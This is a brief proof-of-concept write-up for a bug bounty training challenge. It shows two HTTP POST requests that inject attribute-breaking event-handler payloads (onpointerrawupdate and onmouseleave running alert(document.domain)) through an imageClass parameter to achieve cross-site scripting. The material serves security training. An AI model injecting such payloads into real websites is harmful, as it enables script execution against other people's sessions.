# Change the class of our image and pick your favourite!

## target: https://www.bugbountytraining.com/challenges/challenge-2.php


## Poc
### work with Chrome
```
POST /challenges/challenge-2.php HTTP/1.1

imageClass=img1"onpointerrawupdate='alert(document.domain)'">
```
### work with Firefox
```
POST /challenges/challenge-2.php HTTP/1.1

imageClass=img1"onmouseleave='alert(document.domain)'">
```
<img width="1169" height="595" alt="image" src="https://github.com/user-attachments/assets/dccb6507-9b30-479d-92eb-4c6552bb41b7" />
